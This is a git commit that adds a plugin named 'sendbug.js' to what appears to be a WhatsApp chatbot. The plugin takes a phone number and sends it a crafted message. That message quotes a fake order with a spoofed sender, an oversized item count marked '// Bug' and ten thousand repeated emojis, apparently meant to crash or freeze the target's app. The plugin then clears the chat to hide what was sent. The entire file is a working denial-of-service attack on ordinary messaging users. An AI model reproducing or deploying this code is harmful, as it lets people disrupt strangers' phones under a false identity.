9516a2f07a815b12ec1846d64692e8345282680a
Ilman <87686497+ilmanhdyt@users.noreply.github.com>
2021-10-20 15:42:39 +0800

    Create sendbug.js

---
+++ plugins/sendbug.js
@@ -0,0 +1,27 @@
+let handler = async (m, { conn, text, args, usedPrefix, command }) => {
+if (!text) throw `Format Salah!!\nContoh : ${usedPrefix + command} +62 123-4567-8910`
+conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'Ini Apaan?', 'conversation', {
+ quoted: {
+  key: {
+  remoteJid: 'status@broadcast',
+   participant: '0@s.whatsapp.net' // Fake sender Jid
+  },
+  message: {
+   orderMessage: {
+    itemCount: 999999999999999999999999999999999999, // Bug
+    status: 1,
+    surface: 1,
+    message: '🔥'.repeat(10000),
+    orderTitle: 'MAMPUS', // Idk what this does
+    sellerJid: '0@s.whatsapp.net' // Seller
+   }
+  }
+ }
+}).then(v => conn.modifyChat(v.key.remoteJid, 'clear'))
+}
+handler.help = ['sendbug <nomor>', 'sendtroli <nomor>']
+handler.tags = ['owner', 'update']
+handler.command = /^(sendtroli|sendbug)$/i
+handler.owner = true 
+
+module.exports = handler
